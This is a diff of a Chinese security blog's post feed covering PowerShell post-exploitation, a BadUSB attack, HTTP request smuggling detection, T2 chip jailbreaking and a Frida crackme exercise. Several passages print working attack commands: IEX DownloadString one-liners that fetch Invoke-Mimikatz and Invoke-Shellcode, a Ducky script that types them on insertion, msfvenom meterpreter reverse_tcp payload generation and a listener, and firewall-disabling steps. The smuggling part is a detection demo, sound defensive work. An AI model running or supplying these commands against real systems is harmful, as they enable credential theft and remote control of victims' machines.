@@ -29,7 +29,7 @@
 <p><strong>直接用IEX下载远程的PS1脚本回来权限绕过执行：</strong></p>
 <p><strong>Powershell “IEX(New-ObjectNet.WebClient).DownloadString(‘<a href="https://is.gd/oeoFul’)”;Invoke-Mimikatz">https://is.gd/oeoFul’)”;Invoke-Mimikatz</a> –dumpCreds”</strong></p>
 <h4 id="0x02-PowerSploit"><a href="#0x02-PowerSploit" class="headerlink" title="0x02 PowerSploit"></a>0x02 PowerSploit</h4><p> <strong>Powersploit**</strong>是一款基于powershell的后渗透（Post-exploitation）框架，集成大量渗透相关模块和功能。**</p>
-<p><strong>Github**</strong>地址：<strong>[</strong><a href="https://github.com.mattifestation/PowerSploit**](https://github.com.mattifestation/PowerSploit)">https://github.com.mattifestation/PowerSploit**](https://github.com.mattifestation/PowerSploit)</a></p>
+<p><strong>Github</strong>地址：<strong>[</strong>powersploit](<a href="https://github.com/PowerShellMafia/PowerSploit">https://github.com/PowerShellMafia/PowerSploit</a>)</p>
 <p>将下载下来的powersploit文件夹内的所有文件（不含powersploit文件夹）拷贝到/var/www/html/ 目录下</p>
 <h5 id="模块介绍"><a href="#模块介绍" class="headerlink" title="模块介绍"></a>模块介绍</h5><table>
 <thead>
@@ -72,7 +72,7 @@
 <p><strong>3.下载相应脚本</strong></p>
 <p>IEX (New-Object Net.WebClient).DownloadString(“<a href="http://192.168.98.94/CodeExecution/Invoke-Shellcode.ps1”">http://192.168.98.94/CodeExecution/Invoke-Shellcode.ps1”</a>)</p>
 <p><strong>4.下载反弹木马</strong></p>
-<p>(New-Object Net.Webclient).DownloadString(“<a href="http://192.168.98.94/test”">http://192.168.98.94/test”</a>)</p>
+<p>IEX (New-Object Net.Webclient).DownloadString(“<a href="http://192.168.98.94/test”">http://192.168.98.94/test”</a>)</p>
 <p><strong>5.在powershell下运行</strong></p>
 <p>Invoke-Shellcode -Shellcode($buf)</p>
 <p><strong>完成以上三个命令得到一个meterpreter后渗透会话</strong></p>
@@ -165,12 +165,21 @@
 <p><strong>然后将Keyboard.zip载入</strong></p>
 <h4 id="0x07-HID-Attack-测试"><a href="#0x07-HID-Attack-测试" class="headerlink" title="0x07 HID Attack 测试"></a>0x07 HID Attack 测试</h4><h5 id="1-使用hak5-USB-RUBBER-DUCKY-payload进行测试"><a href="#1-使用hak5-USB-RUBBER-DUCKY-payload进行测试" class="headerlink" title="1.使用hak5-USB RUBBER DUCKY payload进行测试"></a>1.使用hak5-USB RUBBER DUCKY payload进行测试</h5><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/ccc.png" alt="img"></p>
 <h4 id="2-使用PowerSploit进行联合测试"><a href="#2-使用PowerSploit进行联合测试" class="headerlink" title="2.使用PowerSploit进行联合测试"></a>2.使用PowerSploit进行联合测试</h4><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/111111.jpg" alt="img"></p>
-<h6 id="1-创建一个test-txt文件，内容如下："><a href="#1-创建一个test-txt文件，内容如下：" class="headerlink" title="1.创建一个test.txt文件，内容如下："></a>1.创建一个test.txt文件，内容如下：</h6><p>DELAY 5000GUI rDELAY 500STRING cmd.exe /T:01 /K mode CON: COLS=16 LINES=1DELAY 400ENTERDELAY 500ENTERDELAY 400STRING powershellDELAY 500ENTERDELAY 500STRING IEX(New-Object Net.Webclient).DownloadString(“<a href="http://192.168.99.135/CodeExecution/Invoke-Shellcode.ps1”)//地址是kali的DELAY">http://192.168.99.135/CodeExecution/Invoke-Shellcode.ps1”)//地址是kali的DELAY</a> 500ENTERDELAY 500STRING IEX (New-Object Net.Webclient).DownloadString(“<a href="http://192.168.99.135/xpy”)DELAY">http://192.168.99.135/xpy”)DELAY</a> 500ENTERDELAY 500STRING Invoke-Shellcode -Shellcode ($buf)DELAY 500ENTERDELAY 2000ENTERDELAY 5000</p>
+<h6 id="1-创建一个test-txt文件，内容如下："><a href="#1-创建一个test-txt文件，内容如下：" class="headerlink" title="1.创建一个test.txt文件，内容如下："></a>1.创建一个test.txt文件，内容如下：</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DELAY 5000</span><br><span class="line"></span><br><span class="line">GUI r</span><br><span class="line"></span><br><span class="line">DELAY 500</span><br><span class="line"></span><br><span class="line">STRING cmd.exe &#x2F;T:01 &#x2F;K mode CON: COLS&#x3D;16 LINES&#x3D;1</span><br><span class="line"></span><br><span class="line">DELAY 400</span><br><span class="line"></span><br><span class="line">ENTER</span><br><span class="line"></span><br><span class="line">DELAY 500</span><br><span class="line"></span><br><span class="line">ENTER</span><br><span class="line"></span><br><span class="line">DELAY 400</span><br><span class="line"></span><br><span class="line">STRING powershell</span><br><span class="line"></span><br><span class="line">DELAY 500</span><br><span class="line"></span><br><span class="line">ENTER</span><br><span class="line"></span><br><span class="line">DELAY 500</span><br><span class="line"></span><br><span class="line">STRING IEX(New-Object Net.Webclient).DownloadString(“http:&#x2F;&#x2F;192.168.99.135&#x2F;CodeExecution&#x2F;Invoke-Shellcode.ps1”)&#x2F;&#x2F;地址是kali的</span><br><span class="line"></span><br><span class="line">DELAY 500</span><br><span class="line"></span><br><span class="line">ENTER</span><br><span class="line"></span><br><span class="line">DELAY 500</span><br><span class="line"></span><br><span class="line">STRING IEX (New-Object Net.Webclient).DownloadString(“http:&#x2F;&#x2F;192.168.99.135&#x2F;xpy”)</span><br><span class="line"></span><br><span class="line">DELAY 500</span><br><span class="line"></span><br><span class="line">ENTER</span><br><span class="line"></span><br><span class="line">DELAY 500</span><br><span class="line"></span><br><span class="line">STRING Invoke-Shellcode -Shellcode ($buf)</span><br><span class="line"></span><br><span class="line">DELAY 500</span><br><span class="line"></span><br><span class="line">ENTER</span><br><span class="line"></span><br><span class="line">DELAY 2000</span><br><span class="line"></span><br><span class="line">ENTER</span><br><span class="line"></span><br><span class="line">DELAY 5000</span><br></pre></td></tr></table></figure>
+
+
+
 <h5 id="2-运行payload转化脚本"><a href="#2-运行payload转化脚本" class="headerlink" title="2.运行payload转化脚本"></a>2.运行payload转化脚本</h5><p>python Duckyspark_translator.py e:\test1.txt e:\powershell</p>
 <h5 id="3-打开-生成的powershell-ino-文件将其内容拷贝到arduino-中编译"><a href="#3-打开-生成的powershell-ino-文件将其内容拷贝到arduino-中编译" class="headerlink" title="3.打开 生成的powershell.ino 文件将其内容拷贝到arduino 中编译"></a>3.打开 生成的powershell.ino 文件将其内容拷贝到arduino 中编译</h5><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/333.jpg" alt="img"></p>
 <h5 id="4-当编译没有错误时-插入badusb-然后点击“上传”（如下图）"><a href="#4-当编译没有错误时-插入badusb-然后点击“上传”（如下图）" class="headerlink" title="4.当编译没有错误时 插入badusb 然后点击“上传”（如下图）"></a>4.当编译没有错误时 插入badusb 然后点击“上传”（如下图）</h5><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/2222.jpg" alt="img"></p>
-<h5 id="5-监听相应端口"><a href="#5-监听相应端口" class="headerlink" title="5.监听相应端口"></a>5.监听相应端口</h5><p>msfconsole use exploit/multi/handler set payload windows/x64/meterpreter/reverse_tcp set lhost 192.168.99.135 set lport 5555 run</p>
-<h5 id="6-msfvenom生成一个powershell脚本："><a href="#6-msfvenom生成一个powershell脚本：" class="headerlink" title="6.msfvenom生成一个powershell脚本："></a>6.msfvenom生成一个powershell脚本：</h5><p>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.99.135 LPORT=5555 -f powershell -o /var/www/html/test</p>
+<h5 id="5-监听相应端口"><a href="#5-监听相应端口" class="headerlink" title="5.监听相应端口"></a>5.监听相应端口</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfconsole use exploit&#x2F;multi&#x2F;handler </span><br><span class="line"></span><br><span class="line">set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line"></span><br><span class="line">set lhost 192.168.99.135 </span><br><span class="line"></span><br><span class="line">set lport 5555 run</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="6-msfvenom生成一个powershell脚本："><a href="#6-msfvenom生成一个powershell脚本：" class="headerlink" title="6.msfvenom生成一个powershell脚本："></a>6.msfvenom生成一个powershell脚本：</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.99.135 LPORT&#x3D;5555 -f powershell -o &#x2F;var&#x2F;www&#x2F;html&#x2F;test</span><br></pre></td></tr></table></figure>
+
+
+
 <h5 id="7-然后主机插入badusb-反弹成功"><a href="#7-然后主机插入badusb-反弹成功" class="headerlink" title="7.然后主机插入badusb 反弹成功"></a>7.然后主机插入badusb 反弹成功</h5><h4 id="3-使用自己搭建的ftp等互联网服务进行渗透"><a href="#3-使用自己搭建的ftp等互联网服务进行渗透" class="headerlink" title="3.使用自己搭建的ftp等互联网服务进行渗透"></a>3.使用自己搭建的ftp等互联网服务进行渗透</h4><h5 id="（1）用管理员权限打开cmd，进入用户目录，关闭防火墙。"><a href="#（1）用管理员权限打开cmd，进入用户目录，关闭防火墙。" class="headerlink" title="（1）用管理员权限打开cmd，进入用户目录，关闭防火墙。"></a>（1）用管理员权限打开cmd，进入用户目录，关闭防火墙。</h5><p>注1：如果用户防火墙开着在下载文件的时候会弹出提示，这样操作就会失败。</p>
 <p>注2：如果用户装了安全软件如360这种，关闭防火墙的时候会有告警弹出，也会失败。</p>
 <p>cd %USERPROFILE%</p>
@@ -3113,7 +3122,8 @@ In get/set mode no capture occurs.</code></pre><blockquote>
 <h2 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h2><p><strong>一般分析流程</strong></p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.反编译apk，分析代码寻找hook点。</span><br><span class="line">2.编写js代码，调用类的方法或者替换。</span><br><span class="line">3.在python中执行即可。</span><br></pre></td></tr></table></figure>
 
-<h5 id="更新中…"><a href="#更新中…" class="headerlink" title="更新中…."></a>更新中….</h5>]]></content>
+<h2 id="0x07-参考"><a href="#0x07-参考" class="headerlink" title="0x07 参考"></a>0x07 参考</h2><p><a href="https://bbs.pediy.com/thread-227232.htm">https://bbs.pediy.com/thread-227232.htm</a></p>
+]]></content>
       <categories>
         <category>Android</category>
       </categories>
@@ -3450,9 +3460,9 @@ In get/set mode no capture occurs.</code></pre><blockquote>
       </tags>
   </entry>
   <entry>
-    <title>HTTP请求走私协议分析</title>
+    <title>HTTP请求走私漏洞分析</title>
     <url>/2020/09/12/WEB/%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/</url>
-    <content><![CDATA[<h1 id="HTTP请求走私协议分析"><a href="#HTTP请求走私协议分析" class="headerlink" title="HTTP请求走私协议分析"></a>HTTP请求走私协议分析</h1><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="HTTP简介"><a href="#HTTP简介" class="headerlink" title="HTTP简介"></a>HTTP简介</h3><p>HTTP协议是Hyper Text Transfer Protocol(超文本传输协议)：一种无状态的、应用层的、以请求/应答方式运行的协议，它使用可扩展的语义和自描述消息格式，与基于网络的超文本信息系统灵活的互动</p>
+    <content><![CDATA[<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="HTTP简介"><a href="#HTTP简介" class="headerlink" title="HTTP简介"></a>HTTP简介</h3><p>HTTP协议是Hyper Text Transfer Protocol(超文本传输协议)：一种无状态的、应用层的、以请求/应答方式运行的协议，它使用可扩展的语义和自描述消息格式，与基于网络的超文本信息系统灵活的互动</p>
 <p>HTTP协议工作于客户端-服务端架构之上。浏览器作为HTTP客户端通过URL向HTTP服务端即WEB服务器发送所有请求。Web服务器根据接收到的请求后，向客户端发送响应信息。</p>
 <p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200912191232407.png" alt="image-20200912191232407"></p>
 <p>HTTP是一个基于TCP/IP通信协议来传递数据(HTML 文件, 图片文件, 查询结果等)。</p>
@@ -3655,6 +3665,34 @@ In get/set mode no capture occurs.</code></pre><blockquote>
 <p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201201200757014.png" alt="image-20201201200757014"></p>
 <p>访问主页，成功弹窗，可以知道，js文件成功的被前端服务器进行了缓存。</p>
 <p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201201200845798.png" alt="image-20201201200845798"></p>
+<h2 id="如何检测"><a href="#如何检测" class="headerlink" title="如何检测"></a>如何检测</h2><h3 id="检测思路来自于这里，这里提供下检测的demo"><a href="#检测思路来自于这里，这里提供下检测的demo" class="headerlink" title="检测思路来自于这里，这里提供下检测的demo"></a>检测思路来自于<a href="https://blog.riskivy.com/流量夹带http-request-smuggling-检测方案的实现/">这里</a>，这里提供下检测的demo</h3><h4 id="1-CL-TE"><a href="#1-CL-TE" class="headerlink" title="1.CL-TE"></a>1.CL-TE</h4><p>Payload：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: test.com</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Content-Length: 4</span><br><span class="line"></span><br><span class="line">1\r\n</span><br><span class="line">Z\r\n</span><br><span class="line">Q\r\n</span><br><span class="line">\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>
+
+<p><strong>检测思路</strong></p>
+<p>Content-Length为4的时候，后段chunk收到长度为1的数据快，但是没有结束标志，一直等待，导致前端响应超时（一般超过5s）</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: test.com</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Content-Length: 4</span><br><span class="line"></span><br><span class="line">1\r\n</span><br><span class="line">Z</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>Content-Length为11的时候，此时的G是一个无效的块大小值，所以请求结束，不会超时</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: test.com</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Content-Length: 11</span><br><span class="line"></span><br><span class="line">1\r\n</span><br><span class="line">Z\r\n</span><br><span class="line">G\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>
+
+<p>因此如果 <code>Content-Length</code> 为 4的响应大于5s ，且 <code>Content-Length</code> 为 4的请求时间远大于 <code>Content-Length</code> 为 11的请求时间，说明存在漏洞。</p>
+<h4 id="2-TE-CL"><a href="#2-TE-CL" class="headerlink" title="2 TE-CL"></a>2 TE-CL</h4><p><strong>Payload：</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: test.com</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 6</span><br><span class="line">Transfer-Encoding : chunked</span><br><span class="line"></span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br><span class="line">X</span><br></pre></td></tr></table></figure>
+
+<p><strong>检测思路：</strong></p>
+<p><code>Content-Length</code> 为 6时，后端处理的<code>Content-Length</code>为6，但收到的数据体0\r\n\r\n，因此后端会一直等待第6个字节，直到超时。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: test.com</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 6</span><br><span class="line">Transfer-Encoding : chunked</span><br><span class="line"></span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>
+
+<p><code>Content-Length</code> 为 5时，后端收到的数据体0\r\n\r\n，不会超时。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: test.com</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 6</span><br><span class="line">Transfer-Encoding : chunked</span><br><span class="line"></span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>
+
+<p>因此如果 <code>Content-Length</code> 为 6的响应大于5s ，且 <code>Content-Length</code> 为 6的请求时间远大于 <code>Content-Length</code> 为 5的请求时间，说明存在漏洞。</p>
+<h4 id="3-核心demo实现"><a href="#3-核心demo实现" class="headerlink" title="3 核心demo实现"></a>3 核心demo实现</h4><p>因为CL-TE和TE-CL互斥，因此如果存在CL-TE就跳过TE-CL检测，但检测到存在了漏洞时，进行recheck确认后输出。</p>
+<p>完整代码：<a href="https://github.com/jweny/HTTP-Request-Smuggling-Checker">https://github.com/jweny/HTTP-Request-Smuggling-Checker</a></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_CLTE</span>(<span class="params">self</span>):</span></span><br><span class="line">    result = self.calcTime(<span class="number">4</span>, <span class="string">&quot;1\r\nZ\r\nQ\r\n\r\n\r\n&quot;</span>, <span class="number">11</span>, <span class="string">&quot;1\r\nZ\r\nQ\r\n\r\n\r\n&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_TECL</span>(<span class="params">self</span>):</span></span><br><span class="line">    result = self.calcTime(<span class="number">6</span>, <span class="string">&quot;0\r\n\r\nX&quot;</span>, <span class="number">5</span>, <span class="string">&quot;0\r\n\r\n&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calcTime</span>(<span class="params">self, length_big_time, payload_big_time, length_small_time, payload_small_time</span>):</span></span><br><span class="line">    <span class="comment"># todo 判断self.payload_headers 不为空</span></span><br><span class="line">    <span class="keyword">for</span> headers <span class="keyword">in</span> self.payload_headers:</span><br><span class="line">        headers[<span class="string">&#x27;Content-Length&#x27;</span>] = length_big_time</span><br><span class="line">        big_time = self.getRespTime(headers, payload_big_time)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> big_time:</span><br><span class="line">            big_time = <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> big_time &lt; <span class="number">5</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># Content-Length == 11</span></span><br><span class="line">        headers[<span class="string">&#x27;Content-Length&#x27;</span>] = length_small_time</span><br><span class="line">        small_time = self.getRespTime(headers, payload_small_time)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> small_time:</span><br><span class="line">            small_time = <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> big_time &gt; <span class="number">5</span> <span class="keyword">and</span> big_time / small_time &gt;= <span class="number">5</span>:</span><br><span class="line">            self.valid = <span class="literal">True</span></span><br><span class="line">            self.type = <span class="string">&quot;CL-TE&quot;</span></span><br><span class="line">            self.result_headers = [headers]</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>
+
+
+
 <h2 id="如何防御"><a href="#如何防御" class="headerlink" title="如何防御"></a>如何防御</h2><blockquote>
 <ul>
 <li>禁用代理服务器与后端服务器之间的 TCP 连接重用</li>
@@ -3689,6 +3727,10 @@ In get/set mode no capture occurs.</code></pre><blockquote>
 <p><a href="https://developers.google.com/web/fundamentals/performance/http2">HTTP/2 简介</a></p>
 <p><a href="https://i.blackhat.com/USA-19/Wednesday/us-19-Kettle-HTTP-Desync-Attacks-Smashing-Into-The-Cell-Next-Door.pdf">https://i.blackhat.com/USA-19/Wednesday/us-19-Kettle-HTTP-Desync-Attacks-Smashing-Into-The-Cell-Next-Door.pdf</a></p>
 <p><a href="https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn">https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn</a></p>
+<p><a href="https://portswigger.net/web-security/request-smuggling/exploiting">https://portswigger.net/web-security/request-smuggling/exploiting</a></p>
+<p><a href="https://blog.riskivy.com/流量夹带http-request-smuggling-检测方案的实现/">https://blog.riskivy.com/流量夹带http-request-smuggling-检测方案的实现/</a></p>
+<p><a href="https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn">https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn</a></p>
+<p><a href="https://paper.seebug.org/1048/">https://paper.seebug.org/1048/</a></p>
 ]]></content>
       <categories>
         <category>协议分析</category>
@@ -5387,7 +5429,7 @@ In get/set mode no capture occurs.</code></pre><blockquote>
     <title>Jailbreak_Apple_T2_Chip的相关研究</title>
     <url>/2020/12/03/IOT/Jailbreak-Apple-T2-Chip%E7%9A%84%E7%9B%B8%E5%85%B3%E7%A0%94%E7%A9%B6/</url>
     <content><![CDATA[<p>先放一张图</p>
-<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201203175053947.png" alt="image-20201203175053947"></p>
+<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201215144432769.png" alt="image-20201215144432769"></p>
 <p>更新中…</p>
 <p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/rfh6qOxsLWInTGKc.jpg" alt="Apple T2 chip"></p>
 <h2 id="0x00-Apple-T2-芯片"><a href="#0x00-Apple-T2-芯片" class="headerlink" title="0x00 Apple T2 芯片"></a>0x00 Apple T2 芯片</h2><p>首先什么是<strong>苹果T2芯片</strong>呢苹果官网给出的是：Apple T2 安全芯片是 Apple 设计的第二代定制化 Mac 芯片。通过对其他 Mac 电脑中的几款控制器进行重新设计与整合，例如系统管理控制器、图像信号处理器、音频控制器和 SSD 控制器，T2 芯片为 Mac 带来了多项新功能。</p>
@@ -5591,10 +5633,11 @@ In get/set mode no capture occurs.</code></pre><blockquote>
 <p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/macbook-jailbreak-t2-security-chip.png" alt="img"></p>
 <h2 id="0x04-具体原理"><a href="#0x04-具体原理" class="headerlink" title="0x04 具体原理"></a>0x04 具体原理</h2><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201202201030024.png" alt="image-20201202201030024" style="zoom:50%;">
 
-<p>在Twitter和Reddit上已经提到由于T2芯片和iPhone及其底层硬件之间共享某些硬件和软件功能。从而通过结合最初为越狱的iphone开发的checkm8 + blackbird两个漏洞相结合可以越狱T2安全芯片的Mac和Macbook设备</p>
+<h3 id="核心问题："><a href="#核心问题：" class="headerlink" title="核心问题："></a>核心问题：</h3><p>T2安全芯片上的SepOS微型操作系统是包含基于IOS A10的处理器，据说A12的芯片似乎解决了这个问题，但是未确认</p>
+<p>在Twitter和Reddit上提到由于T2芯片和iPhone及其底层硬件之间共享某些硬件和软件功能。通过结合最初越狱iphone的checkm8 + blackbird两个漏洞便可以越狱T2安全芯片的Mac和Macbook设备</p>
 <p>根据 <a href="https://ironpeak.be/blog/crouching-t2-hidden-danger/">比利时安全公司ironPeak的帖子</a>，越狱T2安全芯片涉及通过USB-C连接到Mac / MacBook，并 在Mac的启动过程中运行<a href="https://checkra.in/">Checkra1n越狱软件</a>的<a href="https://checkra.in/">0.11.0</a>版本 。</p>
-<p>根据ironPeak的说法，这之所以奏效，是因为“ Apple在向客户提供的T2安全芯片中未打开调试界面，允许任何人无需身份验证即可进入设备固件更新（DFU）模式。”</p>
-<p>ironPeak说：“使用这种方法，可以创建一条USB-C电缆，该电缆可以在启动时自动利用您的macOS设备。”</p>
+<p>根据ironPeak的说法，这之所以奏效，是因为“ Apple在向客户提供的T2安全芯片中打开调试界面，允许任何人无需身份验证即可进入设备固件更新（DFU）模式。”</p>
+<p>使用这种方法，可以创建一条USB-C电缆，该电缆可以在启动时自动利用您的macOS设备。</p>
 <p>这使攻击者可以在T2芯片上获得root用户访问权限，并修改和控制目标设备上运行的所有内容，甚至可以恢复加密的数据。</p>
 <h3 id="1-Checkm8"><a href="#1-Checkm8" class="headerlink" title="1.Checkm8"></a>1.Checkm8</h3><p>一句话描述漏洞：对USB请求处理不当造成的UAF漏洞。手里有一个iphone5s，所以决定研究一下checkm8这个漏洞。</p>
 <h4 id="上手尝试"><a href="#上手尝试" class="headerlink" title="上手尝试"></a>上手尝试</h4><p>在分析这个漏洞之前，先对checkm8有一个感性直观的认识，我们首先动动手，做俩实验：分别是使用checkra1n越狱，以及使用ipwndfu提取固化在处理器芯片中的固件代码(SecureROM)。不过在动手之前，先阅读以下写给科技爱好者的文章和广大网友对这个漏洞的讨论：</p>
@@ -5689,6 +5732,292 @@ In get/set mode no capture occurs.</code></pre><blockquote>
       </categories>
       <tags>
         <tag>Apple T2</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Hook框架Frida练习（1）</title>
+    <url>/2020/12/04/Android/Hook%E6%A1%86%E6%9E%B6Frida%E7%BB%83%E4%B9%A0%EF%BC%881%EF%BC%89/</url>
+    <content><![CDATA[<h2 id="文章涉及到的知识点："><a href="#文章涉及到的知识点：" class="headerlink" title="文章涉及到的知识点："></a>文章涉及到的知识点：</h2><ul>
+<li>怎么使用javascript实例化类并调用类方法</li>
+<li>怎么在”jscode”中增加自定义javascript方法</li>
+<li>怎么较为灵活的hook类方法</li>
+</ul>
+<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Mac Os 10.15.5</span><br><span class="line">Python 3.7</span><br><span class="line">Google Nexus 6P Anroid 6.0.1</span><br><span class="line">Frida官网：https:&#x2F;&#x2F;www.frida.re&#x2F;</span><br><span class="line">Frida源码：https:&#x2F;&#x2F;github.com&#x2F;frida</span><br></pre></td></tr></table></figure>
+
+<p>apk的下载地址：<a href="https://github.com/ghostmaze/Android-Reverse/raw/master/WhyShouldIPay/WhyShouldIPay.apk">whyshouldIpay</a></p>
+<h2 id="0x02-APK的简单分析"><a href="#0x02-APK的简单分析" class="headerlink" title="0x02 APK的简单分析"></a>0x02 APK的简单分析</h2><h3 id="1-安装APK"><a href="#1-安装APK" class="headerlink" title="1.安装APK"></a>1.安装APK</h3><p>下载apk安装，先看看是什么功能，简单的使用后，了解到<code>PREMIUM CONETNT</code>内容需要输入License验证后才能查看。<code>PREMIUM CONETNT</code>按钮中的内容应该是答案。</p>
+<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217204346213.png" alt="image-20201217204346213" style="zoom: 33%;">
+
+<h3 id="2-流程分析"><a href="#2-流程分析" class="headerlink" title="2.流程分析"></a>2.流程分析</h3><p>使用jadx将apk反编译出来，分析，在AndroidManifest.xml中找到了启动的Activity是<code>LauncherActivity</code></p>
+<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217204804697.png" alt="image-20201217204804697"></p>
+<p>找到其中的主要代码进行分析</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public void verifyClick(View v) &#123;</span><br><span class="line">						&#x2F;&#x2F;第一个验证，将输入的Licese通过网络验证，但这个肯定是通不过的，这是一个可								能需要绕过的点。</span><br><span class="line">       try &#123;</span><br><span class="line">           InputStream in &#x3D; new URL(&quot;http:&#x2F;&#x2F;broken.license.server.com&#x2F;query?license&#x3D;&quot; + ((EditText) findViewById(R.id.text_license)).getText().toString()).openConnection().getInputStream();</span><br><span class="line">           StringBuilder responseBuilder &#x3D; new StringBuilder();</span><br><span class="line">           byte[] b &#x3D; new byte[0];</span><br><span class="line">           while (in.read(b) &gt; 0) &#123;</span><br><span class="line">               responseBuilder.append(b);</span><br><span class="line">           &#125;</span><br><span class="line">           String response &#x3D; responseBuilder.toString();</span><br><span class="line">           &#x2F;&#x2F;网络验证需要服务器返回 &quot;LICENSEKEYOK&quot;，才能进行下一步</span><br><span class="line">           if (response.equals(&quot;LICENSEKEYOK&quot;)) &#123;</span><br><span class="line">           &#x2F;&#x2F;当网络验证成功后，生成激活秘钥，并写入到preferences文件中</span><br><span class="line">               String activatedKey &#x3D; new String(MainActivity.xor(getMac().getBytes(), response.getBytes()));</span><br><span class="line">               SharedPreferences.Editor editor &#x3D; getApplicationContext().getSharedPreferences(&quot;preferences&quot;, 0).edit();</span><br><span class="line">               editor.putString(&quot;KEY&quot;, activatedKey);</span><br><span class="line">               &#x2F;&#x2F;这样便成功激活</span><br><span class="line">               editor.commit();</span><br><span class="line">               new AlertDialog.Builder(this).setTitle(&quot;Activation successful&quot;).setMessage(&quot;Activation successful&quot;).setIcon(17301543).show();</span><br><span class="line">               return;</span><br><span class="line">           &#125;</span><br><span class="line">           new AlertDialog.Builder(this).setTitle(&quot;Invalid license!&quot;).setMessage(&quot;Invalid license!&quot;).setIcon(17301543).show();</span><br><span class="line">       &#125; catch (Exception e) &#123;</span><br><span class="line">           new AlertDialog.Builder(this).setTitle(&quot;Error occured&quot;).setMessage(&quot;Server unreachable&quot;).setNeutralButton(&quot;OK&quot;, (DialogInterface.OnClickListener) null).setIcon(17301543).show();</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<p>在<code>verifyClick</code>中可以知道生成激活秘钥的算法是<code>MainActivity.xor</code>。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">String activatedKey &#x3D; new String(MainActivity.xor(getMac().getBytes(), response.getBytes()));</span><br></pre></td></tr></table></figure>
+
+<p>到<code>MainActivity</code>中，查看该方法，看上去算起来还是比较麻烦。</p>
